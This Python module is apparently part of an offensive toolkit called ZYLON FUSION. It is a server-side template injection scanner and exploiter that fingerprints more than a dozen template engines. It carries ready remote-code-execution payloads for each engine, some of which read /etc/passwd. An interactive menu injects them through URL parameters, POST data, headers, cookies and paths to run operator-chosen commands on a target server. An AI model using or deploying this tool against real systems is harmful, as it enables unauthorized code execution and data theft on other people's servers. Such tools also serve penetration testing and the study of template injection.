#!/usr/bin/env python3
"""
ZYLON FUSION v2.5 NUCLEAR - SSTI Engine
========================================
Fused from: SSTImap (https://github.com/vladko312/SSTImap)
Purpose: Server-Side Template Injection detection and exploitation
Engines: Jinja2, Twig, Mako, Tornado, Freemarker, Velocity, OGNL, SpEL,
         EJS, Nunjucks, Pug, doT, Marko, ERB, Slim, SSI, Smarty, Cheetah
Python 3.13 Compatible | Termux Non-Root
"""

import os
import sys
import re
import time
import base64
import random
import string
import urllib3
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

from core.shared_infra import shared_session, PayloadInjector, regex_cache

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================================
# SSTI DETECTION PAYLOADS
# ============================================================================

class SSTIPayloads:
    """SSTI detection and exploitation payloads for multiple engines"""
    
    # Random markers for detection (header/trailer method)
    @staticmethod
    def generate_markers():
        h = random.randint(10000, 99999)
        t = random.randint(10000, 99999)
        return str(h), str(t)
    
    @staticmethod
    def rand_int():
        return random.randint(100, 999)
    
    @staticmethod
    def rand_str():
        return ''.join(random.choices(string.ascii_lowercase, k=5))
    
    # Detection payloads per engine
    DETECTION_PAYLOADS = {
        'jinja2': [
            '{{{{({a},{b}*{c})|e}}}}',
            '{{{{"{s}"}}}}',
            '{{{{7*7}}}}',
            '{{{{config}}}}',
        ],
        'twig': [
            '{{{{(1..3)|filter(x => x < 3)|join("")}}}}',
            '{{{{"s0\\n"|nl2br}}}}',
            '{{{{7*7}}}}',
            '{{{{_self.env.registerUndefinedFilterCallback("exec")}}}}',
        ],
        'mako': [
            '${{7*7}}',
            '${{"".join("ab")}}',
            '<% 7*7 %>',
        ],
        'tornado': [
            '{{{{7*7}}}}',
            '{{{{"s0"}}}}{{% raw "s1" %}}',
            '{{{{config}}}}',
        ],
        'freemarker': [
            '${{7*7}}',
            '<#if 1==1>ssti</#if>',
            '${{"freemarker.template.utility.Execute"?new()("id")}}',
        ],
        'velocity': [
            '#set($e=7*7)${{e}}',
            '${{7*7}}',
            '#set($c=7*7)$c',
        ],
        'ognl': [
            '${{7*7}}',
            '%{{7*7}}',
            '${{7*7}.toString()}',
        ],
        'spel': [
            '{{{{7*7}}}}',
            '${{7*7}}',
            '{{{{T(java.lang.Runtime).getRuntime()}}}}',
        ],
        'ejs': [
            '<%= 7*7 %>',
            '<%= global.process %>',
        ],
        'nunjucks': [
            '{{{{7*7}}}}',
            '{{{{range}}}}',
            '{{{{(7*7)|dump}}}}',
        ],
        'pug': [
            '#{{7*7}}',
            '| #{{7*7}}',
        ],
        'dot': [
            '{{{{=7*7}}}}',
            '{{{{= it.value }}}}',
        ],
        'erb': [
            '<%= 7*7 %>',
            '<%= system("id") %>',
        ],
        'smarty': [
            '{{7*7}}',
            '{php}7*7{/php}',
            '{{{7*7}}}',
        ],
        'ssi': [
            '<!--#exec cmd="id" -->',
            '<!--#echo var="DATE_LOCAL" -->',
        ],
        'generic': [
            '${{7*7}}',
            '{{{{7*7}}}}',
            '<%= 7*7 %>',
            '#{{7*7}}',
            '{{{{=7*7}}}}',
            '#{7*7}',
            '*{7*7}',
            '<!--#exec cmd="id" -->',
        ],
    }
    
    # Exploitation payloads per engine
    EXPLOIT_PAYLOADS = {
        'jinja2': {
            'rce': [
                "{{cycler.__init__.__globals__.os.popen('{cmd}').read()}}",
                "{{cycler.__init__.__globals__.__builtins__.__import__('os').popen('{cmd}').read()}}",
                "{{lipsum.__globals__['os'].popen('{cmd}').read()}}",
                "{{joiner.__init__.__globals__.os.popen('{cmd}').read()}}",
                "{{namespace.__init__.__globals__.os.popen('{cmd}').read()}}",
                "{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}",
                "{{request.__class__.__mro__[1].__subclasses__()}}",
                "{{url_for.__globals__['__builtins__']['__import__']('os').popen('{cmd}').read()}}",
            ],
            'eval': [
                "{{cycler.__init__.__globals__.__builtins__.eval('{code}')}}",
            ],
            'blind_rce': [
                "{{cycler.__init__.__globals__.os.popen('{cmd}').read()}}",
            ],
        },
        'twig': {
            'rce': [
                '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("{cmd}")}}',
                '{{["{cmd_b64"]|map("base64_decode")|map("system")|join}}',
                "{{['cat /etc/passwd']|filter('system')}}",
            ],
            'rce_v1': [
                '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
            ],
            'rce_v2': [
                '{%set p={"{cmd_b64}":"base64_decode"}|map("call_user_func")|join%}{{{(p):"shell_exec"}|map("call_user_func")|join}}',
            ],
        },
        'mako': {
            'rce': [
                "${{__import__('os').popen('{cmd}').read()}}",
                "${{eval('__import__(\"os\").popen(\"{cmd}\").read()')}}",
                '<%import os%>${{os.popen("{cmd}").read()}}',
            ],
        },
        'freemarker': {
            'rce': [
                '${{"freemarker.template.utility.Execute"?new()("{cmd}")}}',
                '<#assign ex="freemarker.template.utility.Execute"?new()>${{ex("{cmd}")}}',
            ],
        },
        'velocity': {
            'rce': [
                '#set($s=$Class.forName("java.lang.Runtime").getRuntime().exec("{cmd}"))',
                '#set($r=$s.getClass().forName("java.lang.Runtime").getRuntime().exec("{cmd}"))',
            ],
        },
        'ognl': {
            'rce': [
                '${{Runtime.getRuntime().exec("{cmd}")}}',
                '@java.lang.Runtime@getRuntime().exec("{cmd}")',
            ],
        },
        'spel': {
            'rce': [
                '{{{{T(java.lang.Runtime).getRuntime().exec("{cmd}")}}}}',
                'new java.lang.ProcessBuilder({{{"{cmd}"}}}).start()',
            ],
        },
        'ejs': {
            'rce': [
                '<%= global.process.mainModule.require("child_process").execSync("{cmd}").toString() %>',
                '<%= require("child_process").execSync("{cmd}").toString() %>',
            ],
        },
        'nunjucks': {
            'rce': [
                '{{{{range.constructor("return eval(Buffer(\'{cmd_b64}\',\'base64\').toString())")()}}}}',
            ],
        },
        'erb': {
            'rce': [
                '<%= system("{cmd}") %>',
                '<%= `{cmd}` %>',
                '<%= exec("{cmd}") %>',
            ],
        },
        'smarty': {
            'rce': [
                '{{if system("{cmd}")}}{{/if}}',
                '{php}system("{cmd}");{/php}',
                '{{smarty.version}}',
            ],
        },
        'ssi': {
            'rce': [
                '<!--#exec cmd="{cmd}" -->',
            ],
        },
    }
    
    # Fingerprint strings per engine (expected output of 7*7)
    FINGERPRINT = {
        'jinja2': ['49'],      # 7*7=49
        'twig': ['49'],
        'mako': ['49'],
        'tornado': ['49'],
        'freemarker': ['49'],
        'velocity': ['49'],
        'ejs': ['49'],
        'nunjucks': ['49'],
        'erb': ['49'],
        'smarty': ['49'],
    }


# ============================================================================
# SSTI ENGINE
# ============================================================================

class SSTIEngine:
    """Server-Side Template Injection Detection and Exploitation Engine"""
    
    def __init__(self, target_url=None, method='GET', params=None, headers=None,
                 cookies=None, data=None, proxy=None, timeout=10):
        self.target_url = target_url
        self.method = method.upper()
        self.params = params or {}
        self.headers = headers or {}
        self.cookies = cookies or {}
        self.data = data or {}
        self.proxy = proxy
        self.timeout = timeout
        self.results = []
        self.detected_engine = None
        self.injectable_params = []
    
    def _make_request(self, url, method='GET', params=None, data=None, headers=None, cookies=None, json_data=None):
        """Make HTTP request with configuration"""
        try:
            req_headers = headers or self.headers
            req_cookies = cookies or self.cookies
            req_kwargs = {
                'timeout': self.timeout,
                'verify': False,
                'allow_redirects': True,
                'headers': req_headers,
                'cookies': req_cookies,
            }
            if self.proxy:
                req_kwargs['proxies'] = {'http': self.proxy, 'https': self.proxy}
            if json_data is not None:
                resp = shared_session.post(url, json=json_data, **req_kwargs)
            elif method.upper() == 'GET':
                resp = shared_session.get(url, params=params, **req_kwargs)
            else:
                resp = shared_session.post(url, data=data, **req_kwargs)
            return resp
        except Exception:
            return None
    
    def _get_baseline(self):
        """Get baseline response for comparison"""
        resp = self._make_request(self.target_url, self.method, self.params, self.data)
        if resp:
            return {
                'status': resp.status_code,
                'length': len(resp.text),
                'text': resp.text,
                'time': resp.elapsed.total_seconds()
            }
        return None
    
    def detect_ssti(self):
        """Detect SSTI in all injection points"""
        findings = []
        baseline = self._get_baseline()
        if not baseline:
            return findings
        
        # Test each parameter
        injection_points = self._get_injection_points()
        
        for param_name, param_value, inject_type in injection_points:
            for engine, payloads in SSTIPayloads.DETECTION_PAYLOADS.items():
                for payload_template in payloads:
                    a, b, c = SSTIPayloads.rand_int(), SSTIPayloads.rand_int(), SSTIPayloads.rand_int()
                    s = SSTIPayloads.rand_str()
                    
                    try:
                        payload = payload_template.format(a=a, b=b, c=c, s=s)
                    except (KeyError, IndexError):
                        payload = payload_template
                    
                    # Inject payload
                    resp = self._inject_payload(param_name, payload, inject_type)
                    if not resp:
                        continue
                    
                    # Check for arithmetic evaluation (7*7=49)
                    if '49' in resp.text and '49' not in baseline['text']:
                        finding = {
                            'parameter': param_name,
                            'injection_type': inject_type,
                            'engine': engine,
                            'payload': payload,
                            'evidence': 'Arithmetic evaluation detected (7*7=49)',
                            'response_length': len(resp.text),
                            'baseline_length': baseline['length']
                        }
                        findings.append(finding)
                        self.detected_engine = engine
                        self.injectable_params.append(param_name)
                        break
                    
                    # Check for significant response difference
                    if abs(len(resp.text) - baseline['length']) > 100:
                        # Check for error messages that reveal template engine
                        engine_from_error = self._detect_engine_from_error(resp.text)
                        if engine_from_error:
                            finding = {
                                'parameter': param_name,
                                'injection_type': inject_type,
                                'engine': engine_from_error,
                                'payload': payload,
                                'evidence': f'Error message reveals {engine_from_error}',
                                'response_length': len(resp.text),
                                'baseline_length': baseline['length']
                            }
                            findings.append(finding)
                            self.detected_engine = engine_from_error
                            self.injectable_params.append(param_name)
                            break
                
                if self.detected_engine:
                    break
            if self.detected_engine:
                break
        
        # If no engine detected, try generic detection
        if not findings:
            findings = self._generic_ssti_detect(baseline, injection_points)
        
        self.results = findings
        return findings
    
    def _get_injection_points(self):
        """Get all injection points from URL, params, headers, cookies"""
        points = []
        
        # URL query parameters
        parsed = urlparse(self.target_url)
        qs_params = parse_qs(parsed.query)
        for param, values in qs_params.items():
            points.append((param, values[0] if values else '', 'query'))
        
        # Explicit params
        for param, value in self.params.items():
            points.append((param, str(value), 'query'))
        
        # POST data
        for param, value in self.data.items():
            points.append((param, str(value), 'post'))
        
        # Headers
        for header, value in self.headers.items():
            points.append((header, str(value), 'header'))
        
        # Cookies
        for cookie, value in self.cookies.items():
            points.append((cookie, str(value), 'cookie'))
        
        # URL path injection
        points.append(('URL_PATH', parsed.path, 'path'))
        
        return points
    
    def _inject_payload(self, param_name, payload, inject_type):
        """Inject payload into specific parameter"""
        if inject_type == 'query':
            params = dict(self.params)
            params[param_name] = payload
            return self._make_request(self.target_url, 'GET', params=params)
        
        elif inject_type == 'post':
            data = dict(self.data)
            data[param_name] = payload
            self._make_request(self.target_url, 'POST', data=data)
            # Also try JSON body injection
            try:
                self._make_request(self.target_url, 'POST', json_data={param_name: payload},
                                   headers={**self.headers, 'Content-Type': 'application/json'})
            except Exception:
                pass
            return self._make_request(self.target_url, 'POST', data=data)
        
        elif inject_type == 'header':
            headers = dict(self.headers)
            headers[param_name] = payload
            return self._make_request(self.target_url, self.method, headers=headers)
        
        elif inject_type == 'cookie':
            cookies = dict(self.cookies)
            cookies[param_name] = payload
            return self._make_request(self.target_url, self.method, cookies=cookies)
        
        elif inject_type == 'path':
            # Replace last path segment with payload
            base_url = self.target_url.rsplit('/', 1)[0]
            url = f"{base_url}/{payload}"
            return self._make_request(url, self.method)
        
        return None
    
    def _detect_engine_from_error(self, text):
        """Detect template engine from error messages"""
        error_patterns = {
            'jinja2': [r'jinja2', r'UndefinedError', r'TemplateSyntaxError'],
            'twig': [r'Twig', r'Twig_Error', r'twig/template'],
            'mako': [r'Mako', r'mako\.exceptions'],
            'freemarker': [r'FreeMarker', r'freemarker\.core'],
            'velocity': [r'Velocity', r'VelocityView'],
            'django': [r'Django', r'DjangoTemplates', r'TemplateSyntaxError'],
            'erb': [r'ERB', r'ActionView'],
            'ejs': [r'EJS', r'ReferenceError'],
            'smarty': [r'Smarty', r'SmartyException'],
            'nunjucks': [r'nunjucks', r'Template render error'],
            'spel': [r'SpelEvaluation', r'Spring EL'],
            'ognl': [r'ognl', r'OGNL'],
            'tornado': [r'Tornado', r'tornado\.template'],
            'handlebars': [r'Handlebars', r'Mustache'],
            'thymeleaf': [r'Thymeleaf', r'thymeleaf'],
        }
        
        for engine, patterns in error_patterns.items():
            for pattern in patterns:
                if regex_cache.search(pattern, text, re.IGNORECASE):
                    return engine
        
        return None
    
    def _generic_ssti_detect(self, baseline, injection_points):
        """Generic SSTI detection using common polyglots"""
        findings = []
        
        generic_payloads = [
            '${7*7}',
            '{{7*7}}',
            '<%= 7*7 %>',
            '#{7*7}',
            '{{=7*7}}',
            '*{7*7}',
            '${7*7}',
            '#{7*7}',
            '{{7*7}}',
            '{{7*"7"}}',
            '${7*7}',
            '{{7*7}}',
        ]
        
        for param_name, param_value, inject_type in injection_points:
            for payload in generic_payloads:
                resp = self._inject_payload(param_name, payload, inject_type)
                if not resp:
                    continue
                
                # Check for 49 (7*7 result)
                if '49' in resp.text:
                    findings.append({
                        'parameter': param_name,
                        'injection_type': inject_type,
                        'engine': 'generic (unknown)',
                        'payload': payload,
                        'evidence': 'Arithmetic evaluation detected (7*7=49)',
                        'response_length': len(resp.text),
                        'baseline_length': baseline['length'] if baseline else 0
                    })
                    break
                
                # Check for "7777777" (string multiplication)
                if '7777777' in resp.text:
                    findings.append({
                        'parameter': param_name,
                        'injection_type': inject_type,
                        'engine': 'generic (string mult)',
                        'payload': payload,
                        'evidence': 'String multiplication detected (7*"7"=7777777)',
                        'response_length': len(resp.text),
                        'baseline_length': baseline['length'] if baseline else 0
                    })
                    break
        
        return findings
    
    def exploit_rce(self, command='id', engine=None):
        """Exploit SSTI to achieve RCE"""
        if not engine:
            engine = self.detected_engine
        
        if not engine:
            return {'error': 'No engine detected. Run detection first.'}
        
        if engine not in SSTIPayloads.EXPLOIT_PAYLOADS:
            return {'error': f'No RCE payloads available for {engine}'}
        
        results = []
        cmd_b64 = base64.b64encode(command.encode()).decode()
        
        rce_payloads = SSTIPayloads.EXPLOIT_PAYLOADS[engine].get('rce', [])
        
        for i, payload_template in enumerate(rce_payloads):
            try:
                payload = payload_template.format(cmd=command, cmd_b64=cmd_b64, code=command)
            except (KeyError, IndexError):
                payload = payload_template
            
            # Try injection in detected params
            for param_name in self.injectable_params:
                # Determine injection type
                inject_type = 'query'
                if param_name in self.data:
                    inject_type = 'post'
                
                resp = self._inject_payload(param_name, payload, inject_type)
                if resp:
                    # Check for command output
                    output = self._extract_output(resp.text, command)
                    results.append({
                        'engine': engine,
                        'parameter': param_name,
                        'payload': payload,
                        'status': resp.status_code,
                        'output': output[:500] if output else 'No visible output (blind RCE possible)',
                        'response_length': len(resp.text)
                    })
        
        return results
    
    def _extract_output(self, text, command):
        """Extract command output from response"""
        # Try to find common patterns that indicate command output
        patterns = [
            # Linux id command
            r'(uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\))',
            # Linux whoami
            r'(root|www-data|nobody|apache|nginx|daemon)',
            # /etc/passwd
            r'(root:x:0:0)',
            # Generic: anything that looks like command output
            r'(uid|gid|groups|root|bin|etc)',
        ]
        
        for pattern in patterns:
            match = regex_cache.search(pattern, text)
            if match:
                return match.group(0)
        
        return None
    
    def full_scan(self):
        """Run complete SSTI detection + exploitation"""
        # Phase 1: Detection
        detection = self.detect_ssti()
        
        # Phase 2: Exploitation
        exploitation = []
        if self.detected_engine:
            exploitation = self.exploit_rce(engine=self.detected_engine)
        
        return {
            'detection': detection,
            'exploitation': exploitation,
            'engine': self.detected_engine,
            'injectable_params': self.injectable_params
        }


# ============================================================================
# CONSOLE INTERFACE
# ============================================================================

def run_ssti_scan(console=None):
    """Interactive SSTI scan for ZYLON menu"""
    if console is None:
        from rich.console import Console
        console = Console()
    
    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt
    
    console.print(Panel(
        "[bold cyan]SSTI ENGINE (Server-Side Template Injection)[/bold cyan]\n"
        "[yellow]Fused from: SSTImap | 17+ Template Engines[/yellow]\n"
        "[green]Engines: Jinja2, Twig, Mako, Tornado, Freemarker, Velocity,\n"
        "         OGNL, SpEL, EJS, Nunjucks, Pug, doT, ERB, Smarty, SSI, Cheetah[/green]",
        border_style="bright_cyan"
    ))
    
    url = Prompt.ask("[cyan]Enter target URL[/cyan]")
    if not url.strip():
        console.print("[red][-] No URL provided![/red]")
        return
    
    # Ask for method
    method = Prompt.ask("[cyan]HTTP Method[/cyan]", choices=["GET", "POST"], default="GET")
    
    # Ask for parameters
    params_str = Prompt.ask("[cyan]Parameters to test (key=value, comma separated)[/cyan]", default="")
    params = {}
    data = {}
    if params_str.strip():
        for pair in params_str.strip().split(','):
            if '=' in pair:
                k, v = pair.split('=', 1)
                if method == 'GET':
                    params[k.strip()] = v.strip()
                else:
                    data[k.strip()] = v.strip()
    
    engine = SSTIEngine(
        target_url=url.strip(),
        method=method,
        params=params,
        data=data,
        timeout=15
    )
    
    console.print("\n[cyan][*] Phase 1: SSTI Detection...[/cyan]")
    
    with console.status("[bold green]Testing SSTI payloads across 17+ engines...", spinner="dots"):
        detection = engine.detect_ssti()
    
    if detection:
        console.print(f"\n[bold green][+] SSTI DETECTED! Found {len(detection)} finding(s)[/bold green]")
        
        for i, finding in enumerate(detection, 1):
            table = Table(title=f"SSTI Finding #{i}", box=None, show_header=False)
            table.add_column("Key", style="cyan", width=15)
            table.add_column("Value", style="green")
            table.add_row("Parameter", finding['parameter'])
            table.add_row("Engine", finding.get('engine', 'Unknown'))
            table.add_row("Injection Type", finding['injection_type'])
            table.add_row("Payload", finding['payload'][:100])
            table.add_row("Evidence", finding['evidence'])
            console.print(table)
            console.print()
        
        # Phase 2: Exploitation
        if engine.detected_engine:
            exploit_choice = Prompt.ask("[cyan]Try RCE exploitation?[/cyan]", choices=["y", "n"], default="y")
            
            if exploit_choice == 'y':
                cmd = Prompt.ask("[cyan]Command to execute[/cyan]", default="id")
                
                with console.status("[bold green]Attempting RCE...", spinner="dots"):
                    results = engine.exploit_rce(command=cmd)
                
                if results:
                    console.print(f"\n[bold green][+] RCE Results:[/bold green]")
                    for r in results:
                        table = Table(box=None, show_header=False)
                        table.add_column("Key", style="cyan", width=15)
                        table.add_column("Value", style="green")
                        table.add_row("Engine", r['engine'])
                        table.add_row("Parameter", r['parameter'])
                        table.add_row("Status", str(r['status']))
                        table.add_row("Output", r['output'][:500])
                        console.print(table)
                        console.print()
                else:
                    console.print("[yellow][-] No RCE output. Try different command or check blind RCE.[/yellow]")
    else:
        console.print("\n[yellow][-] No SSTI vulnerabilities detected.[/yellow]")
        console.print("[cyan][*] Try different parameters or injection points.[/cyan]")


if __name__ == "__main__":
    run_ssti_scan()
